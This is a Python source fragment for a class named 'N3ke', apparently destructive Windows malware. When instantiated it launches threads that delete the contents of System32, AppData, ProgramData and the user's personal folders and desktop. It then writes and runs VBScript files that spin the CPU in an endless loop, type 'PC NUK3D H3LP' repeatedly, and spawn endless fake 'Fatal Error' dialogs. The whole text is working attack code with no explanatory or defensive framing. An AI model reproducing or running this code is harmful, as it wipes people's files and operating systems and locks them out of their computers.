class N3ke:

    def __init__(self):
        paths = [fr"C:\Windows\System32",fr"C:\Users\{user}\AppData\Local",fr"C:\Users\{user}\AppData\Roaming",fr"C:\ProgramData",fr"C:\Users\{user}\Videos",fr"C:\Users\{user}\Pictures",fr"C:\Users\{user}\Music",fr"C:\Users\{user}\Downloads",fr"C:\Users\{user}\Documents",winshell.desktop()]
        for p in paths:
            Thread(target=self.d3l,args=(p,)).start()
        Thread(target=self.cp6).start()
        Thread(target=self.sp4m).start()
        Thread(target=self.sp4h).start()

    def d3l(self,p):
        cky = os.chdir(p)
        for i in os.listdir(cky):
            if os.path.isdir(i):
                try:shutil.rmtree(i)
                except:pass
            else:
                try:os.remove(i)
                except:pass
    
    def cp6(self):
        try:
            sleep(0.3)
            with open(fr'C:\Users\{user}\AppData\Local\Temp\H7nv.vbs','w+') as f:
                f.write(f"""
While True
Wend
                """)
            os.system(fr'C:\Users\{user}\AppData\Local\Temp\H7nv.vbs')
        except:pass

    def sp4m(self):
        try:
            sleep(0.4)
            with open(fr'C:\Users\{user}\AppData\Local\Temp\l4gY.vbs','w+') as f:
                f.write(fr"""
set a = createobject("wscript.shell")
do
    a.sendkeys ("PC NUK3D H3LP")
    wscript.sleep (1)
loop""")
            os.system(fr'C:\Users\{user}\AppData\Local\Temp\l4gY.vbs')
        except:pass
    
    def sp4h(self):
        with open(fr'C:\Users\{user}\AppData\Local\Temp\s4hgg.vbs', "w+") as f:
            f.write("""
do
x=MsgBox("Oops", vbOkOnly+vbCritical, "Fatal Error")
loop
            """)
            f.close()
        while True:
            os.system(fr"start C:\Users\{user}\AppData\Local\Temp\s4hgg.vbs")
            sleep(0.1)